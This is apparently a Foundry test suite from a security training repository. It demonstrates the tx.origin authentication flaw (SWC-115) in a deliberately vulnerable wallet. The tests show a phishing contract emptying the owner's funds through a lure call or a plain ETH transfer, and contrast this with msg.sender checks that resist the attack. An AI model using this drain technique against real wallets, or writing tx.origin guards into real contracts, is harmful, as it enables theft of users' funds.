// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {TxOriginWallet} from "../src/vulnerable/TxOriginWallet.sol";
import {TxOriginAttacker} from "../src/attackers/TxOriginAttacker.sol";

/// @title TxOriginWalletTest
/// @notice Proves the tx.origin authentication flaw (SWC-115) in TxOriginWallet:
///         the guard rejects strangers correctly, yet any contract the owner is
///         tricked into calling inherits the owner's authority and can empty the
///         wallet. Also proves the HALF of the privileged surface that checks
///         `msg.sender` instead resists the same attack.
/// @dev Local chain, fake funds only.
///
///      THE FOUNDRY TRAP THIS SUITE IS BUILT AROUND: `vm.prank(addr)` sets only
///      `msg.sender`. It leaves `tx.origin` at forge-std's default sender
///      (0x1804c8AB...), so under a one-argument prank this wallet rejects even
///      its real owner and the bug looks like it is not there. Every call below
///      that models a signed transaction uses the TWO-argument form
///      `vm.prank(sender, origin)` - that second argument is the exploit.
contract TxOriginWalletTest is Test {
    TxOriginWallet internal wallet;
    TxOriginAttacker internal attacker;

    /// @dev The wallet's owner, and the phishing victim.
    address internal victim = makeAddr("victim");
    /// @dev The human behind the exploit contract.
    address internal attackerEoa = makeAddr("attackerEoa");
    /// @dev An uninvolved third party, used to show honest transfers still work.
    address internal bystander = makeAddr("bystander");
    /// @dev A legitimate recovery nominee.
    address internal recovery = makeAddr("recovery");

    uint256 internal constant FUNDS = 3 ether;
    /// @dev What the victim keeps in their own EOA, to spend on the lure.
    uint256 internal constant POCKET = 1 ether;

    function setUp() public {
        // prank covers exactly ONE call - the constructor - so the wallet's
        // owner is the victim, not this test contract.
        vm.prank(victim);
        wallet = new TxOriginWallet();

        vm.deal(victim, FUNDS + POCKET);
        vm.prank(victim);
        wallet.deposit{value: FUNDS}();

        // The exploit contract, owned by the attacker's EOA.
        vm.prank(attackerEoa);
        attacker = new TxOriginAttacker(wallet);
    }

    /// @notice Baseline. If this fails, every result below is meaningless.
    function test_setupIsSane() public view {
        assertEq(wallet.owner(), victim, "victim owns the wallet");
        assertEq(wallet.balance(), FUNDS, "wallet holds 3 ETH");
        assertEq(wallet.recoveryAddress(), address(0), "no recovery nominated yet");
        assertEq(victim.balance, POCKET, "victim kept 1 ETH outside the wallet");
        assertEq(attacker.owner(), attackerEoa, "EOA owns the exploit");
        assertEq(address(attacker.wallet()), address(wallet), "exploit points at the wallet");
        assertEq(attacker.loot(), 0, "exploit starts empty");
        assertFalse(attacker.hijacked(), "no attack has run yet");
    }

    /// @notice The wallet is not broken for its owner: a transaction the victim
    ///         signs and sends DIRECTLY works exactly as intended. The fix must
    ///         preserve this, so it is asserted before anything is exploited.
    function test_ownerCanUseTheirOwnWallet() public {
        vm.prank(victim, victim);
        wallet.transferTo(bystander, 1 ether);

        assertEq(bystander.balance, 1 ether, "bystander received the transfer");
        assertEq(wallet.balance(), FUNDS - 1 ether, "wallet debited");
        assertEq(wallet.owner(), victim, "owner unchanged");
    }

    /// @notice The guard is REAL: nobody can attack this wallet on their own.
    ///         Every route fails while the victim is not the transaction origin -
    ///         direct calls, and the exploit contract run by the attacker.
    ///         This is the contrast with vuln 2, where a stranger walked in alone.
    function test_strangerCannotAttackAlone() public {
        // A stranger's own signed transaction: msg.sender AND tx.origin are theirs.
        vm.startPrank(attackerEoa, attackerEoa);

        vm.expectRevert("TxOriginWallet: not owner");
        wallet.sweep(attackerEoa);

        vm.expectRevert("TxOriginWallet: not owner");
        wallet.transferTo(attackerEoa, 1 ether);

        // Routing through the exploit contract does not help either: the guard
        // reads the ORIGIN, and the origin is the attacker, not the victim.
        vm.expectRevert("TxOriginWallet: not owner");
        attacker.claimReward();

        vm.stopPrank();

        assertEq(wallet.balance(), FUNDS, "wallet untouched");
        assertEq(attacker.loot(), 0, "nothing stolen");
        // The exploit's own counter is still 0: `claimReward()` reverted, and a
        // reverted call discards its state writes. A failed attempt on a
        // tx.origin wallet leaves no trace on-chain at all.
        assertEq(attacker.lureCount(), 0, "the failed attempt was rolled back entirely");
    }

    /// @notice The finding, localized: with the victim as transaction origin, the
    ///         `tx.origin`-guarded functions are hijackable, while the two that
    ///         check `msg.sender` inline reject the very same call. Same
    ///         transaction, same signer, two different answers - that split is
    ///         the whole lesson, and it proves the bug is the modifier.
    function test_onlyTxOriginGuardedCallsAreHijackable() public {
        // Nominate a recovery address honestly, so the attempt below is rejected
        // on identity rather than on the "no recovery set" precondition.
        vm.prank(victim, victim);
        wallet.setRecoveryAddress(recovery);

        // The msg.sender half RESISTS. The victim signs; the exploit calls; the
        // wallet sees the exploit contract as the caller and refuses.
        vm.prank(victim, victim);
        vm.expectRevert("TxOriginWallet: not owner");
        attacker.tryHijackRecovery();

        vm.prank(victim, victim);
        vm.expectRevert("TxOriginWallet: not recovery");
        attacker.tryRecoverOwnership();

        assertEq(wallet.recoveryAddress(), recovery, "recovery nominee unchanged");

        // The tx.origin half DOES NOT. Identical setup, opposite outcome.
        vm.prank(victim, victim);
        attacker.tryTransfer(1 ether);

        assertEq(attacker.loot(), 1 ether, "transferTo was hijacked");
        assertEq(wallet.balance(), FUNDS - 1 ether, "wallet debited without the owner asking");
    }

    /// @notice The exploit: the victim signs one call to a contract that looks
    ///         like a reward claim, and their wallet is emptied inside that same
    ///         transaction.
    function test_victimIsPhishedAndWalletIsEmptied() public {
        vm.prank(victim, victim);
        attacker.claimReward();

        assertEq(wallet.balance(), 0, "wallet emptied");
        assertEq(attacker.loot(), FUNDS, "exploit holds the entire balance");
        assertTrue(attacker.hijacked(), "attack recorded");
        assertEq(attacker.stolen(), FUNDS, "exploit reports what it took");
        assertEq(attacker.lureCount(), 1, "ONE transaction from the victim was enough");
    }

    /// @notice The victim's experience, which the invariant above does not show:
    ///         the attacker never took ownership. The victim still holds the
    ///         title to a wallet that can no longer pay them. Nothing in their
    ///         own view of the contract looks wrong until they try to spend.
    function test_victimKeepsTitleButLosesMoney() public {
        vm.prank(victim, victim);
        attacker.claimReward();

        assertEq(wallet.owner(), victim, "the victim is STILL the owner");
        assertEq(wallet.recoveryAddress(), address(0), "nothing about the wallet was reconfigured");

        // And yet their own money is gone.
        vm.prank(victim, victim);
        vm.expectRevert("TxOriginWallet: insufficient balance");
        wallet.transferTo(bystander, 1 ether);

        assertEq(bystander.balance, 0, "the honest transfer could not be paid");
    }

    /// @notice The lure does not have to be a function call. The victim sending
    ///         plain ETH to this address - a tip, a donation, a mistyped
    ///         transfer - triggers the same sweep through `receive()`.
    function test_driveByEthTransferIsEnough() public {
        vm.prank(victim, victim);
        (bool ok,) = address(attacker).call{value: 0.1 ether}("");

        assertTrue(ok, "the victim's transfer succeeded");
        assertEq(wallet.balance(), 0, "wallet emptied by a bare ETH send");
        assertEq(attacker.loot(), FUNDS + 0.1 ether, "exploit holds the wallet AND the tip");
    }

    /// @notice The loot is extractable - the theft is real, not an accounting
    ///         artefact stuck inside the exploit contract.
    function test_lootIsExtractable() public {
        vm.prank(victim, victim);
        attacker.claimReward();

        uint256 before = attackerEoa.balance;
        vm.prank(attackerEoa);
        attacker.collect();

        assertEq(attackerEoa.balance - before, FUNDS, "attacker's EOA received the funds");
        assertEq(attacker.loot(), 0, "exploit contract emptied");
    }

    /// @notice The exploit's own guard holds. It checks `msg.sender`, so the
    ///         victim - even as transaction origin - cannot claw the loot back.
    function test_collectRevertsForNonOwner() public {
        vm.prank(victim, victim);
        attacker.claimReward();

        vm.prank(victim, victim);
        vm.expectRevert(TxOriginAttacker.NotOwner.selector);
        attacker.collect();

        assertEq(attacker.loot(), FUNDS, "loot still with the exploit");
    }

    /// @notice The flaw does not depend on the amount at stake: whatever the
    ///         wallet holds when the victim takes the lure is what leaves.
    function testFuzz_phishingTakesWhateverIsThere(uint96 extra) public {
        uint256 topUp = bound(uint256(extra), 0, 100 ether);
        vm.deal(victim, victim.balance + topUp);
        if (topUp > 0) {
            vm.prank(victim, victim);
            wallet.deposit{value: topUp}();
        }

        uint256 held = wallet.balance();
        assertEq(held, FUNDS + topUp, "wallet holds the deposited total");

        vm.prank(victim, victim);
        attacker.claimReward();

        assertEq(wallet.balance(), 0, "emptied regardless of size");
        assertEq(attacker.loot(), held, "exploit took exactly what was there");
        assertEq(attacker.stolen(), held, "and reported it");
    }
}
